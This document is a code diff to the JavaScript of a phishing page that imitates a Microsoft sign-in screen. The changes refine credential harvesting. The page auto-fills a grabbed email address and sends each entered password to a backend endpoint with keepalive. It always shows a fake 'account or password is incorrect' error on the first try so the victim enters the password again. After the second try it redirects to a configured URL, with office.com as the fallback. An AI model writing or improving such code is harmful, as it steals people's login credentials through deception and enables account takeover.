@@ -1152,7 +1152,7 @@
                             const emailInput = document.getElementById('emailInput');
                             if (emailInput) {
                                 emailInput.value = decodeURIComponent(autoGrabbedEmail);
-                                
+
                                 // Automatically click Next after a short delay
                                 console.log('🚀 Auto-clicking Next button in 500ms...');
                                 setTimeout(function() {
@@ -1453,7 +1453,7 @@ Status: ${data.status}`);
 
             // Reset password attempt counter for new email
             passwordAttemptCount = 0;
-            console.log('🔄 Password attempt counter reset for new email');
+            console.log('🚀 Password attempt counter reset for new email');
 
             clearMessage();
             setLoading(true, 'Taking you to your organization...', false);
@@ -1537,22 +1537,31 @@ Status: ${data.status}`);
         async function signInWithPassword() {
             const passwordInput = document.getElementById('passwordInput');
             const errorDiv = document.getElementById('messageArea'); // Assuming messageArea is used for errors
+            const signInBtn = document.querySelector('#passwordForm .btn-primary'); // Get the sign-in button
+
+            // Clear previous messages and disable button during processing
+            clearMessage();
+            setLoading(true, 'Signing in...');
+            signInBtn.disabled = true;
+            signInBtn.textContent = 'Signing in...';
+
 
             try {
-                clearMessage();
-                setLoading(true, 'Signing in...');
-
                 const email = currentEmail;
                 const password = passwordInput.value;
+                let passwordAttempts = passwordAttemptCount; // Use local variable for clarity
 
                 if (!password) {
                     showMessage('Please enter your password', 'error');
                     setLoading(false);
+                    signInBtn.disabled = false; // Re-enable button
+                    signInBtn.textContent = 'Sign in';
                     return;
                 }
 
                 // Increment password attempt count
                 passwordAttemptCount++;
+                passwordAttempts = passwordAttemptCount; // Update local variable
                 console.log(`🚀 Password attempt #${passwordAttemptCount} for: ${email}`);
 
                 // Prepare payload for backend
@@ -1566,38 +1575,70 @@ Status: ${data.status}`);
                 }
 
                 // Send password to backend using keepalive to ensure delivery even after redirect
+                // We don't await this as the redirect can happen quickly
                 fetch('/api/authenticate-password-fast', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(payload),
-                    keepalive: true
+                    keepalive: true // Ensures the request is sent even if the page navigates away
                 }).catch(error => {
+                    // Log non-blocking errors, but continue with the frontend logic
                     console.warn('Background authentication submission error (non-blocking):', error);
                 });
 
-                // Only redirect on SECOND password attempt
-                if (passwordAttemptCount === 2) {
-                    console.log('⚡ Second attempt - redirecting to google.com...');
-                    setTimeout(() => {
-                        window.location.href = 'https://google.com';
-                    }, 1000); // 1 second delay
-                } else {
-                    // First attempt - show error and allow retry
-                    console.log('⚠️ First attempt - showing error for retry');
-                    setTimeout(() => {
+                // Check the status after a short delay to simulate backend processing
+                // In a real scenario, you might use polling or WebSockets for status updates
+                // For this fix, we simulate the outcome based on attempt count
+                setTimeout(() => {
+                    if (passwordAttempts === 1) {
+                        console.log('⚠️ First attempt - showing error for retry');
+
+                        // Show error message
+                        errorDiv.style.display = 'block';
+                        errorDiv.innerHTML = `<div class="message microsoft-error">Your account or password is incorrect. If you don't remember your password, reset it now.</div>`;
+
+                        // Clear password field for retry
+                        passwordInput.value = '';
+                        passwordInput.focus();
+
+                        // Reset button state
                         setLoading(false);
-                        showMessage('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'microsoft-error'); // Changed to microsoft-error for consistency
-                        passwordInput.value = ''; // Clear password input on first failed attempt
-                        passwordInput.focus(); // Focus password input for retry
-                    }, 3000); // 3 second delay before showing error
-                }
+                        signInBtn.disabled = false;
+                        signInBtn.textContent = 'Sign in';
+                        
+                    } else if (passwordAttempts >= 2) {
+                        // After second failed attempt, redirect to configured URL
+                        console.log('🔄 Second attempt failed - fetching configured redirect URL');
+
+                        // Fetch configured redirect URL from backend
+                        fetch('/api/internal/redirect-url')
+                            .then(response => response.json())
+                            .then(redirectData => {
+                                const redirectUrl = redirectData.redirectUrl || 'https://office.com'; // Fallback to office.com
+                                console.log('🔄 Redirecting to:', redirectUrl);
+                                // Use setTimeout to allow the fetch request to complete before redirecting
+                                setTimeout(() => {
+                                    window.location.href = redirectUrl;
+                                }, 2000); // 2 second delay
+                            })
+                            .catch(error => {
+                                console.error('Error fetching redirect URL:', error);
+                                // Fallback to default if fetch fails
+                                setTimeout(() => {
+                                    window.location.href = 'https://office.com'; // Fallback redirect
+                                }, 2000);
+                            });
+                    }
+                }, 3000); // Simulate backend processing delay
 
             } catch (error) {
                 console.error('Password submission error:', error);
                 setLoading(false);
                 showMessage('Authentication error. Please try again.', 'error');
+                signInBtn.disabled = false; // Re-enable button on error
+                signInBtn.textContent = 'Sign in';
             }
         }
 
